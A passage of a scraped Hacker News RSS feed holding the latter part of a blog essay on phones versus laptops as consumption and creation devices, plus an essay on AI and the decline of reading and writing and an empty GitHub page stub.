    &lt;head rend="h2"&gt;Asymmetry Hidden in Your Pocket&lt;/head&gt;
    &lt;p&gt;Think about the last time you wrote actual code on a phone. Not "fixed a typo in production at 2am while cursing existence"—I mean real development work. Multiple files open, testing, debugging, deploying.&lt;/p&gt;
    &lt;p&gt;You didn't. Because phones aren't optimized for creation at that scale. They're optimized for rapid-fire consumption: scroll, tap, swipe, consume. Even the "creator" apps—video editors, photo tools, drawing programs—operate within carefully bounded creation sandboxes. You're creating content, but you're not creating systems.&lt;/p&gt;
    &lt;p&gt;Laptops and desktops flip this. The default mode is generative work. Even consumption requires deliberate setup—install browser, navigate to site, manage tabs. The friction isn't a bug; it's the point. Creation requires friction. Friction creates intentionality. Intentionality creates agency.&lt;/p&gt;
    &lt;p&gt;Photography on phones: capture moments, apply filters, share. Photography on computers: RAW processing, color grading, compositing, print preparation.&lt;/p&gt;
    &lt;p&gt;Note-taking on phones: quick captures, voice memos, scattered thoughts. Note-taking on computers: interconnected knowledge systems, research databases, publication workflows.&lt;/p&gt;
    &lt;p&gt;Same activities. Completely different power relationships to the output.&lt;/p&gt;
    &lt;head rend="h2"&gt;Command Positions and Consumption Positions&lt;/head&gt;
    &lt;p&gt;Military organizations understand this instinctively. Command centers use large displays, multiple screens, keyboards, mice—interfaces optimized for generating orders and processing complex information. Field units use tablets and phones—interfaces optimized for receiving commands and reporting status.&lt;/p&gt;
    &lt;p&gt;The same pattern appears everywhere:&lt;/p&gt;
    &lt;p&gt;Trading floors: Banks spend millions on multi-monitor setups for traders. The creation position—analyzing markets, executing strategies, generating alpha—demands computational leverage. Their customers? Mobile apps with colorful buttons and simplified charts. Consumption interfaces for consumption participants.&lt;/p&gt;
    &lt;p&gt;Software development: Engineers command multi-screen workstations with mechanical keyboards and precision mice. End users consume via touch interfaces designed to hide complexity. The power gradient isn't accidental—it's architected.&lt;/p&gt;
    &lt;p&gt;Content platforms: YouTube creators edit on desktops with timeline editors and effect panels. Viewers watch on phones, swiping to the next dopamine hit. TikTok creators spend hours on composition and timing. Consumers scroll infinitely, training the algorithm with each micro-engagement.&lt;/p&gt;
    &lt;p&gt;The asymmetry creates and maintains hierarchies. Not through explicit control, but through interface design that nudges users into either command or compliance modes.&lt;/p&gt;
    &lt;head rend="h2"&gt;Watch Your Mind Shift When You Switch Devices&lt;/head&gt;
    &lt;p&gt;Something curious happens when you switch from laptop to phone for the same task. Notice the mental shift.&lt;/p&gt;
    &lt;p&gt;Laptop mode: agency. Control. Possibility space expanding. I can modify this system. I can build new tools. I can automate this frustration away. The interface assumes competence and offers power.&lt;/p&gt;
    &lt;p&gt;Phone mode: flow. Ease. Possibility space contracting. This is how it works. These are my options. I adapt to the system. The interface assumes simplicity and offers convenience.&lt;/p&gt;
    &lt;p&gt;Neither is inherently wrong. But when 80% of your computing time happens in consumption mode, something shifts in how you relate to digital systems. You stop seeing them as malleable, hackable, controllable. You start seeing them as environmental conditions—like weather patterns you adapt to rather than infrastructures you can reshape.&lt;/p&gt;
    &lt;p&gt;This connects to what I explored in The Great Cognitive Handoff—we're witnessing a phase transition in how humans relate to computational systems. But device choice determines which side of that transition you land on. Creation devices put you in the driver's seat of AI-assisted workflows. Consumption devices make you a passenger in someone else's architecture.&lt;/p&gt;
    &lt;head rend="h2"&gt;Generational Divergence and Interface Fluency&lt;/head&gt;
    &lt;p&gt;That designer isn't wrong to prefer her phone. She's adapted to the dominant computational interface of her generation. TikTok editing on mobile has reached near-parity with desktop video editing for certain output types. The creation sandbox got sophisticated enough for specific use cases.&lt;/p&gt;
    &lt;p&gt;But—and this matters—the sandbox remains someone else's. The app defines the possibility space. The platform determines what's possible. Users create within the system, never of the system.&lt;/p&gt;
    &lt;p&gt;Contrast with coding on a laptop. When you write software, you're not just using a tool—you're modifying the tool itself, extending its capabilities, potentially creating new tools entirely. The recursive loop of creation compounds. Each creation makes new creations possible.&lt;/p&gt;
    &lt;p&gt;As I outlined in Zak's Law of Skill Half-Life, skills at lower abstraction levels have longer durability. Device choice determines which abstraction layers you access. Phones keep you at high abstraction—consumer of finished applications. Computers let you descend toward infrastructure, protocols, systems thinking.&lt;/p&gt;
    &lt;p&gt;The generational split isn't about capability. It's about default stance. Generation Z sees phones as primary computers because phones are functionally complete for consumption-primary workflows. But consumption-primary means command-secondary. And command-secondary means power-secondary.&lt;/p&gt;
    &lt;head rend="h2"&gt;When Consumption Becomes Creation (Sort Of)&lt;/head&gt;
    &lt;p&gt;The counterargument: "But I create on my phone constantly! Videos, photos, tweets, stories..."&lt;/p&gt;
    &lt;p&gt;Yes. And that's precisely the trap.&lt;/p&gt;
    &lt;p&gt;You're generating content—raw material for platform algorithms to process, distribute, monetize. The platform commands the distribution layer. You feed the system. The creation serves consumption at scale.&lt;/p&gt;
    &lt;p&gt;Real creation—the kind that shifts power dynamics—involves building new systems, not just feeding existing ones. Writing code that others will use. Designing tools that change workflows. Publishing research that alters understanding. Creating infrastructure, not just content.&lt;/p&gt;
    &lt;p&gt;Content creation on phones generates value primarily for platforms. Building systems on computers generates value for creators.&lt;/p&gt;
    &lt;p&gt;That's not gatekeeping—it's power topology. The difference between building the casino and playing the slots. Both involve skill, both generate outputs, but only one controls the house edge.&lt;/p&gt;
    &lt;head rend="h2"&gt;Intentional Device Selection as Political Act&lt;/head&gt;
    &lt;p&gt;Recognizing the pattern enables intentional navigation. Device choice becomes strategic rather than habitual.&lt;/p&gt;
    &lt;p&gt;Default to creation devices for:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;System-level thinking and building&lt;/item&gt;
      &lt;item&gt;Long-form writing and deep research&lt;/item&gt;
      &lt;item&gt;Multi-step workflows requiring maintained context&lt;/item&gt;
      &lt;item&gt;Learning new technical skills&lt;/item&gt;
      &lt;item&gt;Any work where you want to control distribution&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Default to consumption devices for:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Rapid information gathering&lt;/item&gt;
      &lt;item&gt;Social connection and lightweight engagement&lt;/item&gt;
      &lt;item&gt;Capturing moments and quick documentation&lt;/item&gt;
      &lt;item&gt;Consuming media you don't need to process deeply&lt;/item&gt;
      &lt;item&gt;Times when convenience outweighs agency&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The key word: default. Intentionality transforms the dynamic. You're not passively sorted into consumption mode by interface design. You're deliberately choosing based on what power position serves your goals.&lt;/p&gt;
    &lt;p&gt;When I write these posts, I use a laptop exclusively—though sometimes the initial spark gets captured on my phone when I'm on the go, or I'll send myself a voice note to preserve context. But the actual writing, structuring, editing? That's laptop work. The friction—managing files, handling git, processing images, structuring arguments across multiple editing sessions—that friction is generative. It forces deeper thinking. It enables system-level creation.&lt;/p&gt;
    &lt;p&gt;When I share the posts, I use my phone. Social platforms optimize for mobile consumption. Meeting audiences where they are means adapting to their interface context.&lt;/p&gt;
    &lt;p&gt;Creation on creation devices. Distribution via consumption devices. The split acknowledges the power topology rather than pretending it doesn't exist.&lt;/p&gt;
    &lt;head rend="h2"&gt;Nobody Mentions the Surveillance Layer&lt;/head&gt;
    &lt;p&gt;Consumption devices track better than creation devices. The business model demands it.&lt;/p&gt;
    &lt;p&gt;Phones know your location, contacts, communication patterns, consumption habits, attention spans, emotional states (inferred from usage), social networks, and behavioral predictions. Every interaction feeds models that predict and shape your next interaction. The consumption interface doubles as a surveillance interface.&lt;/p&gt;
    &lt;p&gt;Laptops can track too, obviously. But the friction matters. Installing tracking software on a laptop requires user cooperation or sophisticated attacks. Phones ship with pervasive tracking as default configuration, baked into the OS and every platform app.&lt;/p&gt;
    &lt;p&gt;Command positions benefit from information asymmetry. Consumption positions suffer from it. Your phone knows vastly more about you than you know about its decision systems. Your laptop—especially if you control the OS and software—inverts that dynamic.&lt;/p&gt;
    &lt;p&gt;The surveillance layer reinforces the power gradient. Consumption devices make you legible to algorithms. Creation devices let you examine and modify the algorithms themselves.&lt;/p&gt;
    &lt;head rend="h2"&gt;Field Notes from Hybrid Workflows&lt;/head&gt;
    &lt;p&gt;Complete abstinence isn't the answer. Phones aren't evil. Laptops aren't sacred. But unconscious device selection hands control to whoever designed the nudges.&lt;/p&gt;
    &lt;p&gt;I run hybrid workflows now, deliberately:&lt;/p&gt;
    &lt;p&gt;Morning pages: Laptop. Long-form thinking requires maintained context and zero platform friction.&lt;/p&gt;
    &lt;p&gt;Social media: Phone. Quick engagement, responding to mentions, staying connected. Consumption mode serves connection goals.&lt;/p&gt;
    &lt;p&gt;Code: Laptop exclusively. No exceptions. Systems-level work demands systems-level interfaces.&lt;/p&gt;
    &lt;p&gt;Photos: Phone for capture, laptop for selection and editing. The split separates the consumption moment (gathering reality) from the creation moment (shaping narrative).&lt;/p&gt;
    &lt;p&gt;Learning: Depends. Consuming lectures and articles? Phone is fine. Actually building understanding through practice and experimentation? Laptop becomes essential.&lt;/p&gt;
    &lt;p&gt;The pattern: consumption activities work on either device. Creation activities—especially those requiring sustained attention and system-level manipulation—demand creation interfaces.&lt;/p&gt;
    &lt;p&gt;Hybrid workflows acknowledge both the convenience of consumption devices and the power of creation devices. The key is matching interface to intention rather than defaulting to whatever's nearest.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why This Isn't Actually About Devices&lt;/head&gt;
    &lt;p&gt;The deeper pattern: every domain has creation/consumption splits, and the split determines power flow.&lt;/p&gt;
    &lt;p&gt;Media: Creating video vs. watching video. Creating music vs. listening to music. Writing vs. reading.&lt;/p&gt;
    &lt;p&gt;Economics: Building businesses vs. working in businesses. Designing financial instruments vs. using financial products.&lt;/p&gt;
    &lt;p&gt;Governance: Writing policy vs. following policy. Shaping discourse vs. consuming discourse.&lt;/p&gt;
    &lt;p&gt;Education: Researching and synthesizing vs. memorizing and regurgitating.&lt;/p&gt;
    &lt;p&gt;In every case, creation positions enable command-and-control over consumption positions. Not through force—through architecture. The systems are designed such that creators set parameters within which consumers operate.&lt;/p&gt;
    &lt;p&gt;Device choice is just the most visible manifestation. Phones optimize you for consumption across all domains. Laptops enable creation across all domains. The interface shapes the possibility space, which shapes agency, which shapes power.&lt;/p&gt;
    &lt;p&gt;The pattern appears in Empire of One too—algorithmic systems assign roles based on engagement patterns. Consumption-mode users get served consumption-optimized roles. Creation-mode users retain more agency over their relationship to the system.&lt;/p&gt;
    &lt;head rend="h2"&gt;What Comes Next: Interface Convergence or Divergence?&lt;/head&gt;
    &lt;p&gt;Two futures branch from here:&lt;/p&gt;
    &lt;p&gt;Convergence scenario: Devices become functionally equivalent. Phones gain full creation capabilities, laptops maintain consumption convenience. The split dissolves. Power dynamics flatten as interface asymmetry disappears.&lt;/p&gt;
    &lt;p&gt;Divergence scenario: Creation and consumption interfaces deliberately separate further. Platforms optimize for behavioral sorting—consumption users get friction-free engagement loops, creation users get ever-more-powerful system-manipulation tools. The power gradient steepens.&lt;/p&gt;
    &lt;p&gt;Current trends suggest divergence. Platform incentives reward consumption (easier to monetize attention than agency). Creation tools grow more sophisticated but remain specialized. The middle ground—devices good at both—struggles commercially because optimization for one mode degrades the other.&lt;/p&gt;
    &lt;p&gt;Apple knows this. iPad occupies the uncomfortable middle: too constrained for serious creation, too expensive for pure consumption. The product fights its own identity. Meanwhile, MacBooks lean harder into creation (M-series chips optimized for professional workflows) and iPhones lean harder into consumption (algorithmic feeds perfected to near-addiction levels).&lt;/p&gt;
    &lt;p&gt;The market is choosing divergence. Which means power gradients will steepen unless we deliberately resist the sort.&lt;/p&gt;
    &lt;head rend="h2"&gt;Intentional Computing as Resistance&lt;/head&gt;
    &lt;p&gt;The resistance isn't rejecting phones or fetishizing laptops. The resistance is noticing which mode you're operating in and choosing based on desired outcomes rather than interface nudges.&lt;/p&gt;
    &lt;p&gt;Questions for daily practice:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Which device am I reaching for, and why?&lt;/item&gt;
      &lt;item&gt;Does this task serve my goals, or someone else's metrics?&lt;/item&gt;
      &lt;item&gt;Am I creating systems or feeding systems?&lt;/item&gt;
      &lt;item&gt;Would switching devices change my relationship to this work?&lt;/item&gt;
      &lt;item&gt;What power position am I accepting by using this interface?&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The questions create space between stimulus (notification, urge, habit) and response (grab phone, open app, scroll). That space is where agency lives.&lt;/p&gt;
    &lt;p&gt;Some days I deliberately leave my laptop at home. Force myself into consumption mode, see what happens. Other days I leave my phone on airplane mode. Force creation mode, notice the friction.&lt;/p&gt;
    &lt;p&gt;Both experiments reveal the same truth: the interface shapes the possible more than we want to admit. Recognizing the shaping creates opportunities to shape back.&lt;/p&gt;
    &lt;head rend="h2"&gt;Beyond Devices: Your Default Stance Toward Reality&lt;/head&gt;
    &lt;p&gt;Device choice reflects something more fundamental than technology preferences. It reflects your default stance toward information and power.&lt;/p&gt;
    &lt;p&gt;Do you see yourself primarily as a consumer of culture or creator of culture? Do you want to understand systems or use systems? Do you optimize for convenience or control?&lt;/p&gt;
    &lt;p&gt;Neither answer is "correct"—but the answer determines your position in power topologies that span everything from social platforms to economic systems to governance structures.&lt;/p&gt;
    &lt;p&gt;Creation devices signal and enable a particular relationship to reality: malleable, hackable, subject to intervention. Consumption devices signal and enable the opposite: fixed, given, requiring adaptation.&lt;/p&gt;
    &lt;p&gt;Both stances serve different purposes. The trap is unconscious default to one stance across all contexts. Because the stance becomes self-reinforcing. Consumption mode atrophies creation muscles. Creation mode can miss the forest for the trees of constant optimization.&lt;/p&gt;
    &lt;p&gt;The wisdom is flexibility—consciously choosing creation or consumption mode based on context, rather than being chosen by interface design decisions made by platform architects optimizing for their goals, not yours.&lt;/p&gt;
    &lt;head rend="h2"&gt;Field Manual for the Interface Wars&lt;/head&gt;
    &lt;p&gt;One last thing before I close this laptop and switch to my phone for the rest of the evening:&lt;/p&gt;
    &lt;p&gt;The power dynamic isn't deterministic. You're not locked into consumption mode because you prefer phones. But you are accepting certain architectural choices about agency, control, and possibility space. Knowing that, you can:&lt;/p&gt;
    &lt;p&gt;Choose creation devices when:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Learning new technical skills&lt;/item&gt;
      &lt;item&gt;Building systems or tools&lt;/item&gt;
      &lt;item&gt;Writing anything requiring sustained thought&lt;/item&gt;
      &lt;item&gt;Researching complex topics&lt;/item&gt;
      &lt;item&gt;Any work where you want leverage on your time&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Choose consumption devices when:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Connecting with people&lt;/item&gt;
      &lt;item&gt;Gathering information quickly&lt;/item&gt;
      &lt;item&gt;Capturing moments&lt;/item&gt;
      &lt;item&gt;Relaxing without creating&lt;/item&gt;
      &lt;item&gt;Operating within established systems&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Question your defaults when:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;You reach for a device without thinking&lt;/item&gt;
      &lt;item&gt;Platform engagement feels compulsive&lt;/item&gt;
      &lt;item&gt;You feel controlled rather than in control&lt;/item&gt;
      &lt;item&gt;Your consumption/creation ratio tilts too far either direction&lt;/item&gt;
      &lt;item&gt;Interface friction annoys you (friction might be protective)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The device in your hand isn't just a tool. It's a power topology made physical. Command or comply. Create or consume. Shape or adapt.&lt;/p&gt;
    &lt;p&gt;Both modes have value. But only one mode gets to decide what the other mode encounters.&lt;/p&gt;
    &lt;p&gt;So pay attention to your interface. Because your interface is paying attention to you.&lt;/p&gt;
    &lt;p&gt;What's your consumption/creation ratio? Are you conscious of which mode you're operating from? Hit me up on X or Threads (from whichever device you're using right now).&lt;/p&gt;
    &lt;head rend="h2"&gt;What’s next&lt;/head&gt;
    &lt;p&gt;A few handpicked reads to continue the thread.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Witnesses Carry Weights: How Reality Gets Computed&lt;/head&gt;6 min read&lt;p&gt;From UFO counsel to neighborhood fear to market pricing—reality emerges through weighted witnessing. A field guide to the computational machinery where intent, energy, and expectations become causal forces.&lt;/p&gt;&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;When Terror Comes in Small Packages: Bay Area, A Severed Head, and the Mechanics of Fear&lt;/head&gt;9 min read&lt;p&gt;A severed cat head appears on my Bay Area street. The real violence isn't what was done to the animal—it's what happens next in our networked minds. A forensic analysis of how small horrors become information weapons, and why your neighborhood protocol matters more than your Ring camera.&lt;/p&gt;&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Dark Engagement: Why Everyone Reads, Nobody Claps, and the Machines Remember Everything&lt;/head&gt;6 min read&lt;p&gt;People screenshot my posts instead of liking them. They reference ideas weeks later that never got a single public comment. This personal observation opens into something bigger: how engagement retreats into darkness while machines feast on the open web.&lt;/p&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Subscribe to the newsletter&lt;/head&gt;
    &lt;p&gt;One thoughtful dispatch when the work demands it—frameworks, systems, and field notes.&lt;/p&gt;
    &lt;head rend="h3"&gt;About the Author&lt;/head&gt;
    &lt;p&gt;Engineer-philosopher · Systems gardener · Digital consciousness architect&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45480620</guid><pubDate>Sun, 05 Oct 2025 11:07:53 +0000</pubDate></item><item><title>The deadline isn't when AI outsmarts us – it's when we stop using our own minds</title><link>https://www.theargumentmag.com/p/you-have-18-months</link><description>&lt;doc fingerprint="3f37101d29eb8c85"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;“You have 18 months”&lt;/head&gt;
    &lt;head rend="h3"&gt;The real deadline isn’t when AI outsmarts us — it’s when we stop using our own minds.&lt;/head&gt;
    &lt;p&gt;In fitness, there is a concept called “time under tension.” Take a simple squat, where you hold a weight and lower your hips from a standing position. With the same weight, a person can do a squat in two seconds or 10 seconds. The latter is harder, but it also builds more muscle. More time is more tension; more pain is more gain.&lt;/p&gt;
    &lt;p&gt;Thinking benefits from a similar principle of “time under tension.” It is the ability to sit patiently with a group of barely connected or disconnected ideas that allows a thinker to braid them together into something that is combinatorially new. It’s very difficult to defend this idea by describing other people’s thought processes, so I’ll describe my own.&lt;/p&gt;
    &lt;p&gt;A few weeks ago, The Argument Editor-in-Chief Jerusalem Demsas asked me to write an essay about the claim that AI systems would take all of our jobs within 18 months. My initial reaction was … no?&lt;/p&gt;
    &lt;p&gt;The prediction is so stupendously aggressive and almost certainly wrong, so my instinct was there was really nothing more to say on the subject. Certainly not 1,799 words more. But as I sat with the prompt, several pieces of a puzzle began to slide together: a Financial Times essay I’d read, an Atlantic article I liked, a National Assessment of Educational Progress study I’d saved in a tab, an interview with Cal Newport I’d recorded, a Walter Ong book I was encouraged to read, a stray thought I’d had in the gym recently while trying out eccentric pullups for the first time about how time multiplies both pain and gain in fitness settings. The contours of a framework came into view.&lt;/p&gt;
    &lt;p&gt;The problem of the next 18 months isn’t AI disemploying all workers, or students losing competition after competition to nonhuman agents. The problem is whether we will degrade our own capabilities in the presence of new machines. We are so fixated on how technology will outskill us that we miss the many ways that we can deskill ourselves.&lt;/p&gt;
    &lt;p&gt;You have 18 months.&lt;/p&gt;
    &lt;p&gt;That’s the message from several leading AI executives and thinkers about how long people will retain their advantage over artificial intelligence in the workforce. By the summer of 2027, the story goes, AI’s explosion in capabilities will leave carbon-based life forms in the dust. Up to “half of all entry-level white-collar jobs” will be wiped out, and even Nobel Prize-worthy minds will cower in fear that AI’s architects will have built a “country of geniuses in a datacenter.”&lt;/p&gt;
    &lt;p&gt;This doomsday clock seems true enough to many people, because the question I’ve fielded more than any other from parents in the last few months is some version of: “If AI is about to be better than us at everything, what should my children do?” If generative AI is better at coding, diagnosing, and problem-solving than any software programmer, radiologist, or mathematician, then even the traditionally “safe” majors like computer science, medicine, and math could be anything but safe.&lt;/p&gt;
    &lt;p&gt;I understand the anxiety behind the question, but rather than try to forecast the future as it might turn out, I’d prefer to describe reality as it already exists. While we have no idea how AI might make working people obsolete at some imaginary date, we can already see how technology is affecting our capacity to think deeply right now. And I am much more concerned about the decline of thinking people than I am about the rise of thinking machines.&lt;/p&gt;
    &lt;head rend="h3"&gt;The end of writing, the end of reading&lt;/head&gt;
    &lt;p&gt;In March, New York Magazine published the sort of cover story that goes instantly viral, not because of its shock value, but, quite the opposite, because it loudly proclaimed what most people were already thinking: Everybody is using AI to cheat in school.&lt;/p&gt;
    &lt;p&gt;By allowing high-school and college students to summon into existence any essay on any topic, large language models have created an existential crisis for teachers trying to evaluate their students’ ability to actually write. “College is just how well I can use ChatGPT at this point,” one student told New York Magazine. “Massive numbers of students are going to emerge from university with degrees, and into the workforce, who are essentially illiterate,” a professor echoed.&lt;/p&gt;
    &lt;p&gt;The demise of writing matters because writing is not a second thing that happens after thinking. The act of writing is an act of thinking. This is as true for professionals as it is for students. In “Writing is thinking,” an editorial in Nature, the authors argued that “outsourcing the entire writing process to LLMs” deprives scientists of the important work of understanding what they’ve discovered and why it matters.&lt;/p&gt;
    &lt;p&gt;Students, scientists, and anyone else who lets AI do the writing for them will find their screens full of words and their minds emptied of thought.&lt;/p&gt;
    &lt;p&gt;As writing skills have declined, reading has declined even more. “Most of our students are functionally illiterate,” a pseudonymous college professor using the name Hilarius Bookbinder wrote in a March Substack essay on the state of college campuses. “This is not a joke.” Nor is it hyperbole.&lt;/p&gt;
    &lt;p&gt;Achievement scores in literacy and numeracy are declining across the West for the first time in decades, leading the Financial Times reporter John Burn-Murdoch to wonder if humans have “passed peak brain power” at the very moment that we are building machines to think for us. In the U.S., the so-called Nation’s Report Card, published by the NAEP, recently found that average reading scores hit a 32-year low in 2024 — which is troubling, since the data series only goes back 32 years.&lt;/p&gt;
    &lt;p&gt;Of course, Americans are reading words all the time: email, texts, social media newsfeeds, subtitles on Netflix shows. But these words live in writing fragments that hardly require any kind of sustained focus necessary to make sense of a larger text. Indeed, Americans in the digital age don’t seem interested in or capable of sitting with anything longer than a tweet. The share of Americans overall who say they read books for leisure has declined by nearly 40% since the 2000s.&lt;/p&gt;
    &lt;p&gt;Even America’s highest-performing students have essentially stopped reading anything longer than a paragraph. Last year, The Atlantic’s Rose Horowitch reported that students are matriculating into America’s most-elite colleges without having ever read a full book for school. “Daniel Shore, the chair of Georgetown’s English department, told me that his students have trouble staying focused on even a sonnet,” Horowitch wrote.&lt;/p&gt;
    &lt;p&gt;Nat Malkus, an education researcher at the American Enterprise Institute, suggested to me that high schools have chunkified books to prepare students for the reading-comprehension sections of standardized exams. By optimizing the assessment of reading skills, the U.S. education system appears to have accidentally killed book reading.&lt;/p&gt;
    &lt;p&gt;The decline of writing and reading matters because writing and reading are the twin pillars of deep thinking, according to Cal Newport, a computer science professor and the author of several bestselling books, including Deep Work. The modern economy prizes the sort of symbolic logic and systems thinking for which deep reading and writing are the best practice.&lt;/p&gt;
    &lt;p&gt;AI is “the latest in multiple heavyweight entrances into the prize fight against our ability to actually think,” Newport said. The rise of TV corresponded with the decline in per capita newspaper subscriptions and a slow demise of reading for pleasure. Then along came the internet, followed by social media, the smartphone, and streaming TV.&lt;/p&gt;
    &lt;p&gt;“The one-two punch of reading and writing is like the serum we have to take in a superhero comic book to gain the superpower of deep symbolic thinking,” Newport said. “And so I have been ringing this alarm bell that we have to keep taking the serum.”&lt;/p&gt;
    &lt;p&gt;Newport’s warning echoes an observation made by the scholar Walter Ong in his book “Orality and Literacy.” According to Ong, literacy is no passing skill. It was a means of restructuring human thought and knowledge to create space for complex ideas.&lt;/p&gt;
    &lt;p&gt;Stories can be memorized by people who cannot read or write. But nothing as advanced as, say, Newton’s “Principia” could be passed down from generation to generation without the ability to write down calculus formulas. Oral dialects commonly have only a few thousand words, while “the grapholect known as standard English has … at least a million and a half words,” Ong wrote. If reading and writing “rewired” the logic engine of the human brain, the decline of reading and writing are unwiring our cognitive superpower at the very moment that a greater machine appears to be on the horizon.&lt;/p&gt;
    &lt;p&gt;So what should our children study in an age of thinking machines? While I don’t know what field any particular student should major in, I do feel strongly about what skill they should value: It’s the very same skill that I see in decline. It’s the patience to read long and complex texts; to hold conflicting ideas in our heads and enjoy their dissonance; to engage in hand-to-hand combat at the sentence level within a piece of writing — and to value these things at a time when valuing them is a choice, because video entertainment is replacing reading and ChatGPT essays are replacing writing. As AI becomes abundant, there is a clear and present threat that deep human thinking will become scarce.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45480622</guid><pubDate>Sun, 05 Oct 2025 11:08:25 +0000</pubDate></item><item><title>86 GB/s bitpacking with ARM SIMD (single thread)</title><link>https://github.com/ashtonsix/perf-portfolio/tree/main/bytepack</link><description>&lt;doc fingerprint="3b74d0de090e4684"&gt;
  &lt;main&gt;
    &lt;p&gt;We read every piece of feedback, and take your input very seriously.&lt;/p&gt;
    &lt;p&gt;To see all available qualifiers, see our documentation.&lt;/p&gt;
    &lt;p&gt;There was an error while loading. Please reload this page.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45481008</guid><pubDate>Sun, 05 Oct 2025 12:27:11 +0000</pubDate></item></channel></rss>